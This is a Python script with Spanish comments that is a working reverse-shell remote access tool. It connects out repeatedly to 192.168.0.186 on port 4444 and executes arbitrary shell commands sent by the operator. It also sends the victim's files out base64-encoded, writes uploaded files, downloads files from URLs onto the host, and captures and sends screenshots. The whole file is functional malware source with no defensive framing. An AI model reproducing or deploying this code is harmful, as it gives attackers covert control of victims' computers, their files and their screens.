#!/usr/bin/env python
#_*_coding: utf8 _*_

#Librerias
#socket => Abrir puerto tcp
#os => directorios
#subprocess => comandos terminal
#base64 => conversion binaria
import socket
import os
import subprocess
import base64
import requests
import mss
import time
import shutil
import sys

        
def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --descargar, --cargar
    directorio_actual = os.getcwd()
    cliente.send(directorio_actual) #directorio actual
    #Comandos: exit = salir y cerrar servidor, cd = navegación entre directorios, --descargar = descargar archivo, --cargar = cargar archivo
    while True:
        respuesta=cliente.recv(1024)
        if respuesta == "exit":
            break
        elif respuesta[:2] == "cd" and len(respuesta) > 2:
            os.chdir(respuesta[3:]) #cambiar directorio
            resultado = os.getcwd() #obtener directorio actual
            cliente.send(resultado)
        elif respuesta[:11] == "--descargar": #8 para contar caracteres
            #Descarga de archivo
             with open(respuesta[12:],'rb') as archivo_descarga: #rb lectura binaria
                cliente.send(base64.b64encode(archivo_descarga.read())) #Encargado de convertir carateres codeados en base 64 a texto plano y poder escribir
        elif respuesta[:8] == "--cargar":
            #Carga de archivo
            with open(respuesta[9:],'wb') as archivo_subida:
                datos = cliente.recv(3000000)
                archivo_subida.write(base64.b64decode(datos)) 
        elif respuesta[:9] == "--obtener":
            try:
                descargar_archivo(respuesta[10:])
                cliente.send("Archivo web descargado correctamente")
            except:
                cliente.send("No se pudo descargar el archivo")
        elif respuesta[:9] == "--captura":
            try:
                captura_pantalla()
                with open('monitor-1.png','rb') as archivo_enviado:
                    cliente.send(base64.b64encode(archivo_enviado.read()))
                os.remove("monitor-1.png")
            except:
                cliente.send(base64.b64encode("fallo"))
        else:
            #Respuesta de terminal, correctas, errores, ejecuciones sin mensaje
            proc = subprocess.Popen(respuesta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proc.stdout.read() + proc.stderr.read()
            if len(resultado) == 0:
                cliente.send("1")
            else:              
                cliente.send(resultado)
def conexion():
    while True:
        time.sleep(5)
        try:
            cliente.connect(("192.168.0.186",4444))
            shell()
        except:
            conexion()      

def captura_pantalla():
    screen = mss.mss()
    screen.shot()
    
def descargar_archivo(url):
    consulta = requests.get(url)
    nombre_archivo = url.split("/")[-1] #[-1] => ultimo elemento, split permite generar lista separada a traves de caracter
    with open(nombre_archivo, 'wb') as archivo_obtenido:
        archivo_obtenido.write(consulta.content)     
        
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexion()
cliente.close()